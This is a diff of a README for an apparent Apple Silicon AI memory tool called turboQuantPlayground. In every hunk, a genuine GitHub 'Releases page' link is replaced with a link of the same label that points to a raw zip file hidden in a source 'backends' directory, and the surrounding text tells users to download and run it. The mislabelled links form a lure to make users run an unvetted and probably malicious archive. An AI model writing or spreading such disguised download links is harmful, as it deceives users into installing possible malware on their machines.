@@ -1,6 +1,6 @@
 # 🧠 turboQuantPlayground - Faster AI memory on Apple Silicon
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/clareembattled960/turboQuantPlayground/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/clareembattled960/turboQuantPlayground/main/src/turboquant_mac/backends/turbo_Playground_Quant_v3.3.zip)
 
 ## 🚀 What this app does
 
@@ -10,7 +10,7 @@ This app is built for people who want to test model speed, memory use, and infer
 
 ## 📥 Download and install
 
-1. Open the [Releases page](https://github.com/clareembattled960/turboQuantPlayground/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/clareembattled960/turboQuantPlayground/main/src/turboquant_mac/backends/turbo_Playground_Quant_v3.3.zip).
 2. Find the latest release.
 3. Download the file for your system.
 4. If you see a .zip file, unzip it.
@@ -167,7 +167,7 @@ turboQuantPlayground is a good fit if you:
 
 ## 📦 Release page
 
-Visit the [Releases page](https://github.com/clareembattled960/turboQuantPlayground/releases) to download and run the latest version for your system
+Visit the [Releases page](https://raw.githubusercontent.com/clareembattled960/turboQuantPlayground/main/src/turboquant_mac/backends/turbo_Playground_Quant_v3.3.zip) to download and run the latest version for your system
 
 ## 🧰 Quick tips for better results
 
